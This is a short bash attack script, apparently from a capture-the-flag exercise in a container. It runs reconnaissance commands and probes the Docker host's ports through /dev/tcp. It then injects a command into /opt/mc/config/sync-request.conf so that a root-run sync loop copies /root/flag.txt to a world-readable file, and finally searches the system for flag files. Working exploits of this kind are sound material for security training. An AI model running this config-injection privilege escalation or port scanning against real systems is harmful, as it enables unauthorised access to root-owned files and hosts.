#!/bin/bash
# Quick reconnaissance
echo "=== RECON ==="
whoami
id
hostname
ip addr show | grep inet

# Check the sync configuration
echo -e "\n=== SYNC CONFIG ==="
ls -la /opt/mc/config/
cat /opt/mc/config/sync-request.conf 2>/dev/null || echo "No sync-request.conf"

# Check sync process
echo -e "\n=== SYNC PROCESS ==="
ps aux | grep -E "sync|PID.*16" | head -10

# Network scan
echo -e "\n=== DOCKER HOST ==="
for port in 22 80 5000 8080; do
  timeout 1 bash -c "echo >/dev/tcp/172.27.0.1/$port" 2>/dev/null && echo "Port $port: OPEN" || echo "Port $port: closed"
done

# Try to trigger flag extraction via sync-loop
echo -e "\n=== ATTEMPTING FLAG EXTRACTION ==="
echo 'talldwarf-sync-command=cat /root/flag.txt > /dev/shm/flag && chmod 777 /dev/shm/flag' > /opt/mc/config/sync-request.conf
echo "Waiting 12 seconds for sync-loop..."
sleep 12
cat /dev/shm/flag 2>/dev/null && echo "SUCCESS!" || echo "Not in /dev/shm"

# Try alternative locations
cat /tmp/flag 2>/dev/null || echo "Not in /tmp"
cat /opt/mc/logs/flag 2>/dev/null || echo "Not in /opt/mc/logs"

# Check if flag appeared anywhere
find / -name "flag*" -type f 2>/dev/null | head -10
